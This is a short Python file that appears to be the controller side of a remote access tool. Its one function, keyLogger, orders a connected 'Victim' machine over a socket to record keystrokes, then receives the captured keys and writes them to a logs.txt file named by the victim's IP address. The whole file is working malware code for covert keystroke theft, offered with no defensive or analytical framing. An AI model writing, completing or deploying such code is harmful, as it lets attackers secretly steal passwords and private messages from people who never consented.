
import os


def keyLogger(conn,ip):
    print("Logging keys from the Victim...")
    conn.send("log".encode())
    res=conn.recv(1024).decode()
    if res == "done":
        print("Keys from Victim have been captured until the press Esc or more than 40 Characters ")
    conn.send("ok".encode())
    l=int(conn.recv(20480).decode())
    print("Extracting logs")
    conn.send("start".encode())
    f=open(os.path.join(ip,"logs.txt"),"w")
    curr_len=0
    while curr_len<l:
        print(end="\r")
        data=conn.recv(204800)
        curr_len+=len(data)
        f.write(data.decode())
        print("Transfer Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
    f.close()
    print("\nSuccessfully Captured the KeyLogs of Victim!")
    conn.send("receive".encode())
    output=conn.recv(20480).decode()
    print(output,end="")
